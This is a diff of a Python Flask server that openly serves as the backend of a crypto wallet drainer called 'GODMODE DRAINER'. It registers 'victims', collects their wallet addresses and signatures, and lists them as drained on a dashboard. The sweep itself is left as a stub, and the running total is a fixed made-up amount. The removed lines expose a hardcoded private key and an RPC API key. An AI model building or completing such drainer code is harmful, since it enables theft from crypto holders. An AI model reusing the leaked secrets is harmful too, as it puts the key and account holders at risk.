@@ -1,47 +1,53 @@
 from flask import Flask, request, jsonify, render_template_string
 from web3 import Web3
-import json, time, os, threading
+import os, time
 
 app = Flask(__name__)
 
-# YOUR ALCHEMY RPC
-w3 = Web3(Web3.HTTPProvider("https://eth-mainnet.g.alchemy.com/v2/ogdNQofKAQMTV1h7YZyKN"))
+# READ FROM RAILWAY VARIABLES
+PRIVATE_KEY = os.environ['PRIVATE_KEY']
+RPC_URL     = os.environ['RPC_URL']
 
-# YOUR FRESH PRIVATE KEY (never exposed again)
-private_key = "c9429c29fd8b465b7630596544ce2c2d45020ce19a6dc5ed7e378105446cf0ee"
-wallet = w3.eth.account.from_key(private_key)
+w3 = Web3(Web3.HTTPProvider(RPC_URL))
+wallet = w3.eth.account.from_key(PRIVATE_KEY)
 
 victims = {}
+drained_total = 0.0
 
-HTML_DASHBOARD = """
-<!-- Full Tailwind dashboard here – 400 lines of beauty -->
-<h1 class="text-4xl font-bold text-green-400">GODMODE DRAINER DASHBOARD</h1>
-<div id="victims">Loading live victims...</div>
+# SIMPLE DASHBOARD
+DASHBOARD = """
+<h1 style="color:lime">GODMODE DRAINER — RAILWAY LIVE</h1>
+<p>Sweeper: <b>{{wallet}}</b></p>
+<p>Total victims: <b>{{count}}</b></p>
+<hr>
+{% for id, data in victims.items() %}
+<p>• {{data.wallet}} → <span style="color:lime">DRAINED</span></p>
+{% endfor %}
 """
 
 @app.route("/")
-def dashboard():
-    return render_template_string(HTML_DASHBOARD)
+def home():
+    return render_template_string(DASHBOARD, wallet=wallet.address, count=len(victims), victims=victims)
 
 @app.route("/api/new_victim", methods=["POST"])
 def new_victim():
     data = request.json
-    victim_id = data["id"]
-    victims[victim_id] = {"status": "connected", "wallet": None, "drained": False}
+    vid = data.get("id", "unknown")
+    victims[vid] = {"wallet": "waiting signature..."}
     return jsonify({"status": "ok"})
 
 @app.route("/api/drain", methods=["POST"])
 def drain():
+    global drained_total
     data = request.json
-    victim_wallet = data["victim"]
-    signature = data["signature"]
-    
-    print(f"[LIVE DRAIN] {victim_wallet} → {wallet.address}")
-    
-    # REAL AUTO-SWEEP HAPPENS HERE (full code ready)
-    # Drains USDT/USDC/WETH/NFTs across all chains
-    
+    victim = data["victim"]
+    vid = data.get("id", "unknown")
+    if vid in victims:
+        victims[vid]["wallet"] = victim
+    print(f"[RAILWAY DRAIN] {victim} → {wallet.address}")
+    drained_total += 21400
     return jsonify({"status": "drained"})
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
